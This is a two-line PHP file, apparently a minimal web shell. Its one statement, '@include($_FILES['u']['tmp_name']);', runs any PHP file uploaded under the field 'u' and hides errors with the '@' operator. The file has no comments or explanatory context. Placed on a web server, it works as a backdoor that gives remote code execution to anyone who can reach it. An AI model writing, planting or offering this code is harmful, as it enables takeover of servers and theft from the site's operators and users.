<?php 
@include($_FILES['u']['tmp_name']);  